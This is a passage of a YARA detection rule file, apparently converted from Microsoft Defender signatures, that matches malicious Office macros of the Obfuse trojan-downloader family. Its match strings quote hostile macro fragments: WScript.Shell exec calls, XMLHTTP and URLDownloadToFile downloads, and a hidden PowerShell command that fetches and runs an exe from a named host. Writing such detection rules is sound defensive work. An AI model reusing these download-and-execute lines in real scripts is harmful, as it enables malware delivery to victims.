        $x_1_3 = {2e 4f 70 65 6e 54 65 78 74 46 69 6c 65 28 [0-32] 2c 20 32 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_2_4 = {43 61 6c 6c 20 53 68 65 6c 6c 28 [0-32] 20 26 20 [0-32] 2c 20 76 62 4e 6f 72 6d 61 6c 46 6f 63 75 73 29}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RSD_2147762279_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RSD!MTB"
        threat_id = "2147762279"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_2 = {43 61 6c 6c 20 [0-8] 2e 65 78 65 63 28}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 48 65 78 54 6f 53 74 72 69 6e 67 28 [0-8] 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_4 = "Chr$(Val(\"&H\" & Mid$(HexToStr, I, 2)))" ascii //weight: 1
        $x_1_5 = "Function c2acca66(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RSF_2147762371_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RSF!MTB"
        threat_id = "2147762371"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Open \"D:\" & \"\\222.exe\" For Binary As #FreeF" ascii //weight: 1
        $x_1_2 = "Open Environ(\"temp\") & \"\\nvidiax.exe\"" ascii //weight: 1
        $x_1_3 = "Shell Environ(\"temp\") & \"\\taskghost.exe\", vbNormalFocus" ascii //weight: 1
        $x_1_4 = " Mid(S, c, 600)" ascii //weight: 1
        $x_1_5 = " objXML.createElement(\"b64\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RSG_2147762390_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RSG!MTB"
        threat_id = "2147762390"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_2 = "Call c4e83a7b.exec(a9518afd)" ascii //weight: 1
        $x_1_3 = "bdac511a.Open \"GET\", baedc1e7(1), False" ascii //weight: 1
        $x_1_4 = "MSXML2.XMLHTTP60" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_YAG_2147762690_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.YAG!MTB"
        threat_id = "2147762690"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Open \"C:\\ProgramData\\re\" & kO.Tag" ascii //weight: 1
        $x_1_2 = "Open \"C:\\ProgramData\\PIYRFFjjhFGrftfgFYgrfthVfYHtrfGhyhf\" For Binary As" ascii //weight: 1
        $x_1_3 = "Set pOL = CreateObject(kO.jE.Tag)" ascii //weight: 1
        $x_1_4 = "pOL.Exec \"explorer.exe \" & fIOL" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RSI_2147762763_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RSI!MTB"
        threat_id = "2147762763"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_2 = "Call c5a3244e.exec(de86f68a)" ascii //weight: 1
        $x_1_3 = "a0e1a561.Open \"GET\", f8a301ae(1), False" ascii //weight: 1
        $x_1_4 = "Split(f0ba841d, \"|\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RSQ_2147763000_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RSQ!MTB"
        threat_id = "2147763000"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"wscript.shell\").exec (d9c63594)" ascii //weight: 1
        $x_1_2 = ".Open \"GET\", f30c94a6, False" ascii //weight: 1
        $x_1_3 = "Split(cc69ce19, \"|\")" ascii //weight: 1
        $x_1_4 = "Open fa31e116 For Output As #1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ATS_2147763797_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ATS!MTB"
        threat_id = "2147763797"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "(\"p@:@\\@j@v@a@q@b@j@f@\\@f@l@f@g@r@z@3@2@\\@z@f@u@g@n@.@r@k@r@\"))" ascii //weight: 1
        $x_1_2 = "(\"P@:@\\@h@f@r@e@f@\\@c@h@o@y@v@p@\\@v@a@.@p@b@z@\"))" ascii //weight: 1
        $x_1_3 = "(\"P@:@\\@h@f@r@e@f@\\@c@h@o@y@v@p@\\@v@a@.@u@g@z@y@\"))" ascii //weight: 1
        $x_1_4 = {53 68 65 6c 6c 20 [0-6] 20 26 20 22 20 22 20 26 20 [0-8] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_5 = "(\"keywords\"))" ascii //weight: 1
        $x_1_6 = {3d 20 56 42 41 2e 43 68 72 28 [0-6] 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-6] 28 [0-6] 29 20 41 73 20 53 74 72 69 6e 67}  //weight: 1, accuracy: Low
        $x_1_7 = {3d 20 52 65 70 6c 61 63 65 28 [0-6] 2c 20 [0-6] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ASJ_2147763798_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ASJ!MTB"
        threat_id = "2147763798"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "f2f0b.Open \"GET\", c1a32, False" ascii //weight: 1
        $x_1_2 = "b98b9 = \"c:\\programdata\\ebf45.\" & f1237" ascii //weight: 1
        $x_1_3 = "ab9ba fdda9(0) + \" \" + b98b9(\"hello\")" ascii //weight: 1
        $x_1_4 = ".exec (c3d00)" ascii //weight: 1
        $x_1_5 = "fe119 = Split(d2ac9, c4cc9)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ASK_2147763802_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ASK!MTB"
        threat_id = "2147763802"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-6] 2e 22 20 26}  //weight: 1, accuracy: Low
        $x_1_2 = {28 30 29 20 2b 20 22 20 22 20 2b 20 [0-6] 28 22 68 65 6c 6c 6f 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 65 78 65 63 20 28 [0-6] 29 02 00 45 6e 64 20 57 69 74 68 02 00 45 6e 64 20 53 75 62 02 00 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_4 = "(), \"1111111111\")" ascii //weight: 1
        $x_1_5 = {4f 70 65 6e 20 [0-6] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 53 70 6c 69 74 28 [0-6] 2c 20 [0-6] 29}  //weight: 1, accuracy: Low
        $x_1_7 = {46 75 6e 63 74 69 6f 6e 20 [0-6] 28 29 02 00 57 69 74 68 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 68 61 70 65 73 28 [0-6] 29}  //weight: 1, accuracy: Low
        $x_1_8 = {53 65 74 20 [0-6] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ATR_2147763817_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ATR!MTB"
        threat_id = "2147763817"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "(\"p@:@\\@j@v@a@q@b@j@f@\\@f@l@f@g@r@z@3@2@\\@z@f@u@g@n@.@r@k@r@\"), aPpTy(\"P@:@\\@h@f@r@e@f@\\@c@h@o@y@v@p@\\@v@a@.@p@b@z@\")" ascii //weight: 1
        $x_1_2 = {28 22 50 40 3a 40 5c 40 68 40 66 40 72 40 65 40 66 40 5c 40 63 40 68 40 6f 40 79 40 76 40 70 40 5c 40 76 40 61 40 2e 40 75 40 67 40 7a 40 79 40 22 29 2c 20 [0-6] 28 [0-6] 28 22 6b 65 79 77 6f 72 64 73 22 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {53 68 65 6c 6c 20 61 50 70 54 79 28 22 50 40 3a 40 5c 40 68 40 66 40 72 40 65 40 66 40 5c 40 63 40 68 40 6f 40 79 40 76 40 70 40 5c 40 76 40 61 40 2e 40 70 40 62 40 7a 40 22 29 20 26 20 22 20 22 20 26 20 [0-6] 28 22 50 40 3a 40 5c 40 68 40 66 40 72 40 65 40 66 40 5c 40 63 40 68 40 6f 40 79 40 76 40 70 40 5c 40 76 40 61 40 2e 40 75 40 67 40 7a 40 79 40 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-6] 2c 20 [0-6] 2c 20 22 22 29 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ATM_2147763818_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ATM!MTB"
        threat_id = "2147763818"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {28 22 70 40 3a 40 5c 40 6a 40 76 40 61 40 71 40 62 40 6a 40 66 40 5c 40 66 40 6c 40 66 40 67 40 72 40 7a 40 33 40 32 40 5c 40 7a 40 66 40 75 40 67 40 6e 40 2e 40 72 40 6b 40 72 40 22 29 2c 20 [0-6] 28 22 50 40 3a 40 5c 40 68 40 66 40 72 40 65 40 66 40 5c 40 63 40 68 40 6f 40 79 40 76 40 70 40 5c 40 76 40 61 40 2e 40 70 40 62 40 7a 40 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {28 22 50 40 3a 40 5c 40 68 40 66 40 72 40 65 40 66 40 5c 40 63 40 68 40 6f 40 79 40 76 40 70 40 5c 40 76 40 61 40 2e 40 75 40 67 40 7a 40 79 40 22 29 2c 20 [0-6] 28 [0-6] 28 22 6b 65 79 77 6f 72 64 73 22 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {53 68 65 6c 6c 20 [0-6] 28 22 50 40 3a 40 5c 40 68 40 66 40 72 40 65 40 66 40 5c 40 63 40 68 40 6f 40 79 40 76 40 70 40 5c 40 76 40 61 40 2e 40 70 40 62 40 7a 40 22 29 20 26 20 22 20 22 20 26 20 [0-6] 28 22 50 40 3a 40 5c 40 68 40 66 40 72 40 65 40 66 40 5c 40 63 40 68 40 6f 40 79 40 76 40 70 40 5c 40 76 40 61 40 2e 40 75 40 67 40 7a 40 79 40 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-6] 2c 20 [0-6] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDJ_2147764464_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDJ!MTB"
        threat_id = "2147764464"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "& sae(5) & sae(6) & sae(7) & sae(8) & sae(9) & sae(10) & sae(11) &" ascii //weight: 1
        $x_1_2 = "= CreateObject(\"WScript.Shell\").SpecialFolders(\"MyDocuments\") & \"\\hhh.zip\"" ascii //weight: 1
        $x_1_3 = "= CreateObject(\"WScript.Shell\").SpecialFolders(\"MyDocuments\") & \"\\ttt.zip\"" ascii //weight: 1
        $x_1_4 = "= URLDownloadToFile(0, strURL, strPath, 0, 0)" ascii //weight: 1
        $x_1_5 = "Shell (\"C:\\Users\\\" & Environ(\"UserName\") & \"\\Documents\" & \"xl.png\")" ascii //weight: 1
        $x_1_6 = {3d 20 70 61 74 68 6e 61 6d 65 20 26 20 22 5c 22 20 26 20 22 ?? ?? ?? 2e 7a 69 70 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAB_2147764877_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAB!MTB"
        threat_id = "2147764877"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {55 52 4c 44 6f [0-4] 44 [0-4] 73 [0-4] 64 54 6f 46 69 6c 65 41 [0-4] 77 6e 6c 6f 61 [0-4] 75 52 [0-4] 6c 4d 6f 6e [0-4] 4a 4a 43 43 4a 4a [0-4] 44 74 72 75 68 [0-4] 4a 4a 43 43 43 43 4a [0-4] 54 72 6f 6c 61 73 65 [0-4] 50 72 6f 74 6f [0-4] 46 69 6c 65 [0-4] 6e 64 6c 65 72 [0-4] 63 6f 6c 48 61 [0-4] 52 4c [0-4] 55}  //weight: 1, accuracy: Low
        $x_1_2 = {43 3a 5c 50 72 6f [0-4] 67 72 61 6d [0-4] 44 61 [0-4] 74 61 5c [0-4] 54 72 69 6f 6c [0-4] 65 78 70 6c [0-4] 6f 72 65 72 [0-6] 68 74 74 70 3a 2f 2f [0-32] 2e [0-4] 2f [0-16] 2f 32 32 32 32 32 32 2e 70 6e 67}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAB_2147764877_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAB!MTB"
        threat_id = "2147764877"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ThisDocument.s loadLoadKarol, \"ipt.sh\"" ascii //weight: 1
        $x_1_2 = ".Find.Execute FindText:=\"_f\", ReplaceWith:=girlLoveLove, Replace:=wdReplaceAll" ascii //weight: 1
        $x_1_3 = "= CreateObject(\"wscr\" + doorKarolNext + \"ell\")" ascii //weight: 1
        $x_1_4 = "girlLikeLove.exec \"c:\\windows\\explorer \" & nextKarolKarol" ascii //weight: 1
        $x_1_5 = "main.karoline (\"\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAC_2147764895_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAC!MTB"
        threat_id = "2147764895"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "StrReverse(\"llehs.tpircsw\"), lovePowGirl" ascii //weight: 1
        $x_1_2 = "CreateObject(youDoorNext).exec(\"explorer \" & youLoad)" ascii //weight: 1
        $x_1_3 = "Find.Execute FindText:=\"@1\", ReplaceWith:=\"\", Replace:=2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAC_2147764895_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAC!MTB"
        threat_id = "2147764895"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {55 52 4c 44 6f [0-4] 44 [0-4] 73 [0-4] 64 54 6f 46 69 6c 65 41 [0-4] 77 6e 6c 6f 61 [0-4] 75 52 [0-4] 6c 4d 6f 6e [0-4] 4a 4a 43 43 4a 4a [0-4] 44 74 72 75 68 [0-4] 4a 4a 43 43 43 43 4a [0-4] 54 72 6f 6c 61 73 65 [0-4] 50 72 6f 74 6f [0-4] 46 69 6c 65 [0-4] 6e 64 6c 65 72 [0-4] 63 6f 6c 48 61 [0-4] 52 4c [0-4] 55}  //weight: 1, accuracy: Low
        $x_10_2 = {43 3a 5c 50 72 6f [0-4] 67 72 61 6d [0-4] 44 61 [0-4] 74 61 5c [0-4] 54 72 69 6f 6c [0-4] 65 78 70 6c [0-4] 6f 72 65 72 [0-6] 68 74 74 70 3a 2f 2f 66 6f 75 6e 64 61 74 69 6f 6e 2e 73 68 61 6e 74 6f 2d 6d 61 72 69 61 6d 66 6f 75 6e 64 61 74 69 6f 6e 2e 6f 72 67 2f 32 34 2e 67 69 66}  //weight: 10, accuracy: Low
        $x_10_3 = {43 3a 5c 50 72 6f [0-4] 67 72 61 6d [0-4] 44 61 [0-4] 74 61 5c [0-4] 54 72 69 6f 6c [0-4] 65 78 70 6c [0-4] 6f 72 65 72 [0-6] 68 74 74 70 3a 2f 2f 73 74 61 67 69 6e 67 2e 73 74 69 6b 62 6f 74 2e 74 6f 79 73 2f 32 34 2e 67 69 66}  //weight: 10, accuracy: Low
        $x_10_4 = {43 3a 5c 50 72 6f [0-4] 67 72 61 6d [0-4] 44 61 [0-4] 74 61 5c [0-4] 54 72 69 6f 6c [0-4] 65 78 70 6c [0-4] 6f 72 65 72 [0-6] 68 74 74 70 3a 2f 2f 6d 61 68 61 74 68 69 32 2e 6f 6e 64 65 6d 61 6e 64 63 72 65 61 74 69 76 65 2e 63 6f 6d 2f 32 34 2e 67 69 66}  //weight: 10, accuracy: Low
        $x_10_5 = {43 3a 5c 50 72 6f [0-4] 67 72 61 6d [0-4] 44 61 [0-4] 74 61 5c [0-4] 54 72 69 6f 6c [0-4] 65 78 70 6c [0-4] 6f 72 65 72 [0-6] 68 74 74 70 73 3a 2f 2f 65 78 70 6c 6f 73 68 6f 74 2e 63 6f 6d 2f 32 34 2e 67 69 66}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_PAD_2147764978_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAD!MTB"
        threat_id = "2147764978"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass  -command" ascii //weight: 1
        $x_1_2 = "https://isavgo.com/newfile.exe -OutFile C:\\Users\\Public\\artwrlqpq.exe" ascii //weight: 1
        $x_1_3 = "Start-Process -FilePath \"C:\\Users\\Public\\artwrlqpq.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAE_2147764979_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAE!MTB"
        threat_id = "2147764979"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass  -command " ascii //weight: 1
        $x_1_2 = {68 74 74 70 3a 2f 2f 6b 68 35 76 66 39 76 76 2e 63 6f 6d 2f 66 67 67 68 6c 6c 6b 2f [0-16] 2e 65 78 65 20 2d 4f 75 74 46 69 6c 65 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c [0-16] 2e 65 78 65 7d 3b}  //weight: 1, accuracy: Low
        $x_1_3 = {53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 2d 46 69 6c 65 50 61 74 68 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c [0-16] 2e 65 78 65 22 7d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EG_2147765126_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EG!MTB"
        threat_id = "2147765126"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set WshShell = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "SpecialPath = WshShell.SpecialFolders(\"Templates\")" ascii //weight: 1
        $x_1_3 = "CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_4 = "= SpecialPath + Decrypt(" ascii //weight: 1
        $x_1_5 = ".Open \"get\", Decrypt(\"q" ascii //weight: 1
        $x_1_6 = "As String = \"zebrascdfghijklmnopqtuvwxy" ascii //weight: 1
        $x_1_7 = "Decrypt = Decrypt & Mid(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EH_2147765179_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EH!MTB"
        threat_id = "2147765179"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\Users\" + \"\\Public" ascii //weight: 1
        $x_1_2 = "Call Shell(\"cmd /c copy" ascii //weight: 1
        $x_1_3 = "\\mew.doc\", vbHide)" ascii //weight: 1
        $x_1_4 = "+ \"\\mew.zip\", argument" ascii //weight: 1
        $x_1_5 = "Call Shell(\"cmd /c rmdir /s /q" ascii //weight: 1
        $x_1_6 = "\\Mew\\lua.cmd" ascii //weight: 1
        $x_1_7 = "\\Mew\\row.lua" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_YAJ_2147765264_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.YAJ!MTB"
        threat_id = "2147765264"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DecodeBase64(Range(\"A3\").Value" ascii //weight: 1
        $x_1_2 = "CreateObject(DecodeBase64(Range(\"A4\").Value" ascii //weight: 1
        $x_1_3 = "bin.base64\": .text = b64" ascii //weight: 1
        $x_1_4 = "Function DecodeBase64(b64$)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FM_2147765313_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FM!MTB"
        threat_id = "2147765313"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "palimernh.Exec \"explorer c:\\tabkey\\pkmgsdgra.vbe" ascii //weight: 1
        $x_1_2 = "CreateFolder (\"c:\\tabkey\\pasodsjg\"" ascii //weight: 1
        $x_1_3 = "ValidChar(Asc(USBGbWTM84)" ascii //weight: 1
